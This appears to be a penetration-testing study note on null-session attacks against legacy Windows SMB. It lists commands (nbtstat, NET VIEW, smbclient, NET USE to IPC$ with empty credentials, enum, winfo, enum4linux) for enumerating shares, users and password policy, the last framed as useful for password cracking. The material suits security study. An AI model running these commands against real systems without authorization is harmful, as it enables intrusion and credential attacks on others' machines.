# Null Sessions

### Introduction

**THIS ATTACK ONLY WORKS ON LEGACY WINDOWS SYSTEMS**

These attacks can be used to enumerate

* Passwords
* System Users
* System Groups
* Running System Processes

Null sessions are remotely exploitable, they can be used to call remote apis and remote procedure calls,



### Enumerating Windows Shares

#### Service Enumeration using nbtstat (windows)

```
nbtstat -A IP
```

Analyzing Output Codes

* `<00>` means machine is a workstation
* `<UNIQUE>` means only 1 ip is assigned
* `<20>` tells us that file sharing service is up and running on the machine

#### Shares Enumeration using Net View (windows)

```
NET VIEW IP
```

#### Service Enumeration using nmblookup (linux)

```
nmblookup -A IP
```

#### Shares Enumeration using smbclient (linux)

```
smbclient -L //IP -N
```

* \-N forces tool to not ask for password
* This tool also list **administrative shares** that are hidden by using windows tools.



### Checking for Null Sessions

We try to connect to `ipc$` administrative share without valid credentials. These don't work with `C$`

#### Windows

```
NET USE \\IP\IPC$ '' /u:''
```

This tells windows to connect with empty password and empty username.

#### Linux

```
smbclient //IP/IPC$ -N
```



### Exploiting with [Enum](http://packetstormsecurity.com/search/?q=win32+enum\&s=files) Script

It can be run from windows cmd.

```
enum -S ip
```

\-S lets you enumerate shares of machine, it enumerates admin shares too

```
enum -U ip
```

\-U enumerates the users

```
enum -P ip
```

\-P tells you about the password policy which is useful for password cracking.



### Exploiting with [Winfo](http://packetstormsecurity.com/search/?q=winfo\&s=files) Script

It is also a cli script used to automate null session attack

```
winfo ip -n
```



### Exploiting with Enum4Linux

It is also used to attack null sessions.

